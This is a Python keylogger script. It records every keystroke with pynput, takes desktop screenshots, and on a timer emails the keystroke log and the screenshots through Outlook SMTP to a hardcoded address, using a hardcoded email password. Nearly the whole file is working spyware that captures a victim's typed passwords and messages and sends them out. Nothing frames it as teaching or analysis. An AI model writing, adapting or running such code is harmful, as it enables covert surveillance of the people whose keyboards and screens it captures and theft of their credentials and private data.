#libraries for keystrokes to be logged
from pkg_resources import working_set
import pynput
from pynput.keyboard import Key, Listener

#libraries for email to be sent
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

#libraries for screenshot to be taken 
from multiprocessing import Process, freeze_support
from PIL import Image, ImageGrab
import time 
import os 
from datetime import datetime




#Keystroke functions


keys_information = 'log.txt'
file_path = "conversion"
extend = "\\"
email_address = "keyloggingpro@outlook.com" # Enter disposable email here
password = "keys123@@@" # Enter email password here
toaddr = "keyloggingpro@outlook.com"
now = datetime.now() # current date and time
date_time = now.strftime("%Y-%m-%d-%H-%M-%S")

time_iteration = 15
number_of_iterations_end = 2

number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration

def screenshot():
    im = ImageGrab.grab()
    im.save( date_time + ".png")
    
screenshot()  


#function to send email     

def send_email(filename, attachment, toaddr):
    
    fromaddr = email_address

    msg = MIMEMultipart()

    msg['From'] = fromaddr

    msg['To'] = toaddr

    msg['Subject'] = "Key Logger"

    body = "Keylogging data"

    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet-stream')

    p.set_payload((attachment).read())

    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    msg.attach(p)

    s = smtplib.SMTP(host='smtp-mail.outlook.com', port=587)

    s.starttls()

    s.login(fromaddr, password)

    text = msg.as_string()

    s.sendmail(fromaddr, toaddr, text)

    s.quit()






#function to record keystrokes on press

# Timer for keylogger
while number_of_iterations < number_of_iterations_end:

    count = 0 
    keys = []

    def on_press(key):
        global keys, count,currentTime

        keys.append(key)
        count += 1
        currentTime = time.time()


        if count >= 1:
            count = 0 
            write_file(keys)
            keys = []

    #function to write the recorded key strokes to a file

    def write_file(keys):
        with open(r'log.txt', "a") as f:
            for key in keys:
                k = str(key).replace("'","")

                if k == "Key.space" :
                    f.write(' ')
                    f.close()

                if k == "Key.backspace" :
                    f.write(k.replace("Key.backspace","$"))
                    f.close()

                if k.find("enter") > 0:
                    f.write('\n')
                    f.close()

                elif k.find("Key") == -1:
                    f.write(k);
                    f.close()

            
    #function to stop logging the keys

    def on_release(key):
        if key==Key.esc:
            return False
        if currentTime > stoppingTime:
            return False

    with Listener(on_press=on_press,on_release=on_release) as listener:
        listener.join()

    if currentTime > stoppingTime:

            send_email(keys_information,  keys_information, toaddr)
            screenshot()
            send_email(date_time + ".png", date_time + ".png", toaddr)
            with open( keys_information, "w") as f:
                f.write(" ")
                number_of_iterations = 0

                currentTime = time.time()
                stoppingTime = time.time() + time_iteration

